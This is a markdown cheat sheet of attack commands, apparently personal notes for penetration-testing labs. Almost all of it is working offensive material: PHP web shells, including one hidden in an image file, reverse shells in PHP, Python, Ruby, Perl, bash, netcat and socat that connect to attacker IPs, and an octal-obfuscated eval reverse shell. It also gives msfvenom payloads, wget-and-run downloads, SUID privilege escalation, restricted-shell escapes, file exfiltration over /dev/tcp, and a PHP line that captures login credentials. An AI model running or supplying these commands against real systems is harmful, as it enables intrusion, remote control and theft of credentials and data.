# IMP commands (More used ones)

## bash tricks

```bash
## using commands 

 `commands`

$(command)

${IFS} = space 			to do fast  - echo 'ping -c 1 10.10.14.6'| sed 's/ /${IFS}/g'

{echo,test}  = , means space
``` 


## Reverse Shell

### PHP

#### one liner php cmd 
```php

<?php echo shell_exec($_GET["cmd"]); exit; ?>

<?php system($_GET['cmd']); ?>

<?php system($_REQUEST['cmd']); ?>

<?php echo shell_exec($_GET['e'].' 2>&1'); ?>

<?php echo shell_exec("/usr/local/bin/wget http://192.168.5.1/shell.php -O shell.php 2>&1");?>
	
<?php echo shell_exec("wget http://192.168.5.1/shell.php -O /tmp/shell.php 2>&1");?>

<?php system("wget http://10.10.14.4:8000/sh.php -O /var/tmp/sh.php; php /var/tmp/sh.php"); ?>

```


### Through img php code 
```php

GIF98;
<?php echo shell_exec($_GET["cmd"]); exit; ?>

exiftool -Comment='<?php echo shell_exec($_GET["cmd"]); exit; ?>' oscp.php.png

```


### php reverse shell through terminal
```bash

php -r '$sock=fsockopen("10.10.14.5",4444);exec("/bin/sh -i <&3 >&3 2>&3");'

```

---
## phpmyadmin

```php
# after creating database in sql
`SELECT "<?php system($_GET['cmd']); ?>" into outfile "output file"`
```

## python reverse shell cmd

```bash

python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.8",4444));os.dup2(s.fileno(),0); 	os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.6",4444));os.dup2(s.fileno(),0); 	os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

```

### in sandbox
```python
eval("\137\137\151\155\160\157\162\164\137\137\50\47\157\163\47\51\56\163\171\163\164\145\155\50\47\142\141\163\150\40\55\151\40\76\46\40\57\144\145\166\57\164\143\160\57\61\71\62\56\61\66\70\56\65\56\61\57\64\64\64\64\40\60\76\46\61\47\51") 
```

### In File

```python
#!/usr/bin/python
import socket
import subprocess
import os

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM) 
s.connect(("192.168.5.1",9001)) 
os.dup2(s.fileno(),0) 
os.dup2(s.fileno(),1) 
os.dup2(s.fileno(),2) 
p=subprocess.call(["/bin/sh","-i"]) 

```

### short and sweet 
```python
import os
os.system("/bin/bash") 
```
### Web Server 
```bash
python2 -m SimpleHTTPServer
python3 -m http.server 9000
```

## Ruby
```ruby

ruby -rsocket -e'f=TCPSocket.open("192.168.5.76",443).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'

```

## netcat 
```bash
nc -e /bin/bash 10.10.14.4 4444

nc -c bash 10.10.14.4 4444

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.6 1234 >/tmp/f

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.5.1 4444 >/tmp/f

mkfifo /tmp/f  # To create file and then run the commonad below
cat /tmp/f | /bin/sh -i 2>&1 | nc 10.10.14.8 4444 > /tmp/f 

# To Transfer the file

nc -l -v -p  4444 > secret.zip

nc -w3 10.10.14.5 4444 < secret.zip
```
	
## xterm
```bash
xterm -display 10.0.0.1:1

# to catch the incoming xterm (:1 – which listens on TCP port 6001)

xnest :1

# You’ll need to authorise the target to connect to you (command also run on your host):

xhost +targetip
	
```

## Bash
```bash

/bin/bash -i >& /dev/tcp/10.10.14.4/4444 0>&1
"bash -c 'bash -i >& /dev/tcp/10.10.14.6/4444 0>&1'"

```

## Perl
```bash
perl -e 'use Socket;$i="10.10.14.7";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'


sudo perl -e 'exec "/bin/sh";'

```

## msfvenom
```bash
msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.10.14.7 LPORT=443 -f elf -o shell.elf

msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.10.14.2 LPORT=4444 -f 'fileextension' -o shell.'fileextension'

msfvenom -p windows/shell_reverse_tcp  LHOST=10.10.14.3 LPORT=4444 -f aspx  -o sha.aspx

msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.5.143 LPORT=4444 -f war > sha.war

```

## Suid file making 
```bash
cp /bin/bash /tmp/sha; chown root:root /tmp/sha; chmod +s /tmp/sha

/tmp/sha -p

``` 

## Tricks and tips Or have to broke out of a restricted shell 

### echo 
```bash
echo os.system('/bin/bash')
	
/bin/sh -i

```

### socat
```bash

#Listener:
		socat file:`tty`,raw,echo=0 tcp-listen:4455

#Victim:
		socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4455  

# Port-forwarding
		socat TCP-LISTEN:1234,fork,reuseaddr tcp:127.0.0.1:8080 &

```
	
### vim or vi 
```bash
	
	:set shell=/bin/bash
	
	:shell
```
### ed (ed editor)
```bash
ed
	!'/bin/bash'
	pwd 
```
### awk 
```bash
awk 'BEGIN {system("/bin/bash")}'
```

### less
```bash	
less anyfile.txt
	!'bash'

```
### PATH
```bash
export PATH=$PATH:/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games

```

## To copy file From server
```bash
cat backup.7z > /dev/tcp/10.10.14.6/4444

nc -l -v -p 4444 > bachup.7z

# 		OR

nc -l -v -p  4444 > secret.zip

nc -w3 10.10.14.5 4444 < secret.zip
```

---
## PHP TRICKS
tags:- #PHP

```php

file_put_contents("/tmp/sha", $_POST['log'] . ":" . $_POST['pwd'] . "\n", FILE_APPEND);

```
